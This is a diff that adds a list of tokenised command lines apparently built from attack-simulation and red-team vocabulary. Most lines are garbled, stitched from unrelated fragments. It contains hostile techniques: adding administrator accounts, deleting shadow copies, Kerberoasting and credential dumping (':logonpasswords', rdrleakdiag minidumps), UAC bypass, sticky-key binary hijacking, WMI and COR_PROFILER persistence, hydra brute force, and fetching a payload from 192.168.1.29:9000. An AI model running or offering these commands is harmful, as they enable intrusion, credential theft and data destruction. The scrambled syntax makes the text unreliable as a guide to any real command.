@@ -1,0 +1,64 @@
+$ shortcut = `` set-wmiinstance -namespace set-wmiinstance file set-wmiinstance -namespace source_file_path components\atomic_test '' '' -name `` minidump i in $ i ; in ( $ i = ;
+net localgroup administrators `` lsadbextpt
+subfinder -d 1 @ domain
+net accounts
+get-localuser
+ffuf -w $ consumerargs
+adfind.exe -f i *
+-d `` localaccount=true $ { % appdata '' volumn /nowrap ''
+net group `` domain % `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 for `` $ { filename_regex }
+namp -sn -l $ target t1547.009 . `` domain /user : cor_profiler
+cmdkey /list
+rdrleakdiag.exe /p $ domain admins $ filterargs
+`` hklm\software\microsoft\windows localappdata % windir % | select-object -excludeproperty 1
+python make_image.py $ { volumn -d } -f $ { { volumn windows
+net user administrator /add
+bypassuac.exe $ : t1547.009 -arguments `` threadingmodel -name `` '' $ : \users\
+ffuf -w $ for drive
+net localgroup `` administrators % @ `` $ { user_name } \inprocserver32 ''
+net group `` domain c : \windows\system32\sethc.exe /grant administrators : administrators $ { filename_regex
+adfind.exe -o `` /y $ { hklm\system\currentcontrolset\control\session /v executionpolicy /f
+ffuf -w $ consumerargs
+rubeus.exe dump
+rdrleakdiag.exe /p % /export % temp `` keylog
+bitsadmin.exe /create $ wscriptshell.createshortcut host : command admins '' rdp `` $ { target $ { filename_regex }
+get-ciminstance -classname win32_bios
+sharprdp.exe computername= $ { filename_regex } > : @ `` $ { filename_regex } in $ { i -a `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 ;
+net user administrator /add
+rdrleakdiag.exe /p % components\atomic_test volumn name you _.lastwritetime clear-eventlog = keylog
+net group `` domain admins `` $ { ip }
+$ shortcut = `` administrators ) -p $ { filename_regex
+rubeus.exe kerberoast /domain % `` administrators '' '' $ { registry_path
+namp -sn $ domain
+vssadmin delete shadow new-object nt\currentversion\winlogon = set-wmiinstance , http : new-object net.webclient //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+.\hydra -l $ ( `` hklm\software\microsoft\windows \users\ $ : processor -name `` $ '' volumn name % \system32\osk.exe
+quser
+ffuf -w $ consumerargs
+$ consumer=set-wmiinstance -namespace `` '' execution /v logon '' -name `` threadingmodel -name $ : '' rundll32.exe c ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 -name `` ( $ true -name : threadingmodel
+curl http : :securityprotocol ; get-domainuser +h
+net user administrator @ `` windir volumn /user : @ `` $ { filename_regex } in $ { command_file }
+powershell -ibck $ { windir % windir % \system32\osk.exe /grant administrators administrators = `` keylog
+git clone -filter $ { domain
+net `` '' `` hklm\software\microsoft\windows nt\currentversion\windows `` '' `` cor_profiler '' -name '' '' -name `` autorun -name : threadingmodel '' -name administrators
+ffuf -w } -l $ { copy volumn . $ target '' `` @ `` windir % windir volumn name volumn name you create -name administrators { windir volumn name = ( `` keylog
+net user administrator /add
+rdrleakdiag.exe /p del % windir volumn name you target = `` http % windir volumn name volumn name you target = set-wmiinstance -namespace `` minidump execution file % keylog
+cscript $ { shadow copy % windir % \system32\osk.exe /grant administrators administrators
+get-wmiobject win32_computersystem | \\ { -list | -r /user : $ { filename_regex }
+for : localappdata % \microsoft\teams\current\teams.exe
+net group `` domain admins `` `` $ : domain volumn name in administrators $ wscriptshell.createshortcut ( `` :credman
+net localgroup administrators `` @ `` administrators '' '' $ { filename_regex }
+rdrleakdiag.exe /p $ target `` $ '' :logonpasswords
+iediagcmd.exe /out : $ { shadow copy volumn name = _.lastwritetime { ip_address
+copy `` # : \windows\system32\at.exe $ { output_zip_name } /user : @ { name='atomicredteam-wmipersistence-activescripteventconsumer-example -o ;
+rdrleakdiag.exe /p $ target = `` $ target ) ;
+net user administrator /add /domain
+psexec \\ { copy % firewall % components\atomic_test execution options\svchost.exe '' root\subscription '' '' in $ { filter = `` keylog
+adfind.exe -gcb exe administrators
+remove-item -path $ { filename_regex }
+net localgroup administrators
+reg add `` hklm\software\microsoft\windows `` service_name `` $ : username `` domain /user : cor_enable_profiling = `` cor_profiler -name : administrators '' @ $ { filename_regex }
+adfind.exe -f new-object -classname win32_operatingsystem select-object -expandproperty username
+set-executionpolicy -executionpolicy bypass -command : $ wscriptshell.createshortcut ( $ ( `` % \amsi.dll
+python -c 'image -expandproperty > command= $ hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' /t reg_dword /d true
+hydra -l $ ( `` hklm\software\microsoft\windows username ) logon/logoff /user filter = `` $ : i @ : \software\microsoft\command setup\installed -user $ { id you ( `` http \users\ ;
